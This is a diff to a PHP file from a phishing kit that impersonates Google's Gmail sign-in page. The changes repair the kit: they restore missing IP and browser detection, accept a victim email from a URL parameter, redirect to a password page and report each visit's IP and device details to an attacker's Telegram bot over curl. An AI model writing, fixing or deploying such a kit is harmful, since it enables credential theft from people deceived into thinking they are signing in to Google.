@@ -1,67 +1,73 @@
 <?php
 error_reporting(0);
 session_start();
-include('Antibot/pro.php');
-include('Antibot/blocker.php');
-include('Antibot/blocker_1.php');
-include('Antibot/blocker_2.php');
-include('Antibot/blocker_3.php');
-include('Antibot/blocker_4.php');
-include('session/function.php');
-include('config.php');
+
+// Load config - config.php uses return, so capture it
+$settings = include('config.php');
+
+// Include antibot if it exists
+if (file_exists('antibot.php')) {
+    include('antibot.php');
+}
+
+// Define IP address (was previously set by missing include files)
+$IP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+
+// Detect OS/Browser from User-Agent (was previously set by missing include files)
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+$os = 'Unknown';
+if (preg_match('/Windows/i', $user_agent)) $os = 'Windows';
+elseif (preg_match('/Mac/i', $user_agent)) $os = 'Mac OS';
+elseif (preg_match('/Linux/i', $user_agent)) $os = 'Linux';
+elseif (preg_match('/Android/i', $user_agent)) $os = 'Android';
+elseif (preg_match('/iPhone|iPad/i', $user_agent)) $os = 'iOS';
+
+// Detect browser
+$browser = 'Unknown';
+if (preg_match('/Edge/i', $user_agent)) $browser = 'Edge';
+elseif (preg_match('/Opera|OPR/i', $user_agent)) $browser = 'Opera';
+elseif (preg_match('/Firefox/i', $user_agent)) $browser = 'Firefox';
+elseif (preg_match('/Chrome/i', $user_agent)) $browser = 'Chrome';
+elseif (preg_match('/Safari/i', $user_agent)) $browser = 'Safari';
+$os = $browser . ' on ' . $os;
 
 // Check for existing visitor key in cookie
 if(!isset($_COOKIE['visitor_key'])) {
-    // Generate new random visitor key
     $visitor_key = bin2hex(random_bytes(16));
-    
-    // Set cookie that expires in 30 days
     setcookie('visitor_key', $visitor_key, time() + (86400 * 30), "/");
 }
 
 // Check if email is in URL parameter
 if(isset($_GET['em'])) {
     $email = $_GET['em'];
-    
-    // Check if email is base64 encoded
     if(preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $email)) {
         $decoded = base64_decode($email, true);
         if($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
             $email = $decoded;
         }
     }
-    
-    // Validate email
     if(filter_var($email, FILTER_VALIDATE_EMAIL)) {
-        // Store email in session
         $_SESSION['username'] = $email;
-        
-        // Generate random ID for security
         $random_id = bin2hex(random_bytes(8));
-        
-        // Redirect to pass.php with random ID
         header("Location: pass.php?id=" . $random_id);
         exit();
     }
-    // If email is invalid, continue to the page for manual entry
 }
 
+// Build Telegram message
 $msgtg = "🔐 <b>NEW VISIT</b> 🔐\n";
 $msgtg .= "━━━━━━━━━━━━━━━\n\n";
-
 $msgtg .= "📍 <b>LOCATION INFO</b>\n";
 $msgtg .= "• IP Address: <code>{$IP}</code>\n";
 $msgtg .= "• Location: <code>http://www.geoiptool.com/?IP={$IP}</code>\n\n";
-
 $msgtg .= "💻 <b>DEVICE INFO</b>\n";
 $msgtg .= "• Browser: <code>{$os}</code>\n";
-$msgtg .= "• User-Agent: <code>" . substr($_SERVER['HTTP_USER_AGENT'], 0, 100) . "...</code>\n\n";
-
+$msgtg .= "• User-Agent: <code>" . substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 100) . "...</code>\n\n";
 $msgtg .= "━━━━━━━━━━━━━━━\n";
 $msgtg .= "⏰ " . date("F j, Y g:i a") . "\n\n";
-$msgtg .= " + Dev: <a href='https://t.me/xforgex'>@xforgex</a> +";
 
-if ($settings['send_clicks'] == "1"){
+// Send Telegram notification on visit
+if (is_array($settings) && isset($settings['send_clicks']) && $settings['send_clicks'] == "1" && !empty($settings['chat_id']) && !empty($settings['bot_url'])) {
     $send = [
         'chat_id' => $settings['chat_id'],
         'text' => $msgtg,
@@ -73,12 +79,11 @@ if ($settings['send_clicks'] == "1"){
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
     curl_close($ch);
 }
-
 ?>
 <!DOCTYPE html>
 <!-- saved from url=(0294)https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=ASSHykp2dAPLuBP5HegpyS1GAwz10dMrK_FdnrtCzVXrzXoVee7DuGeLUMokaAZZUcEpkw7hixwEkA&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-233362078%3A1741544750655901&ddm=1 -->
